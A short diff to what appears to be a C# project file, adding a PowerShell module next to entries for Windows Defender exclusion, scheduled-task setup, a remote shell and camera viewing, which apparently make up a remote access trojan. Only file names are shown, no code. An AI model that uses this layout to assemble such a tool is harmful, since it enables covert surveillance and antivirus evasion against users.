@@ -166,6 +166,7 @@
     <Compile Include="Setup\WinDefend\DefenderExclusion.cs" />
     <Compile Include="Setup\FileCopy.cs" />
     <Compile Include="Setup\schtask.cs" />
+    <Compile Include="Tools\Powershell.cs" />
     <Compile Include="Tools\Shell.cs" />
     <Compile Include="Tools\CameraView.cs" />
     <Compile Include="Tools\Chat.cs">
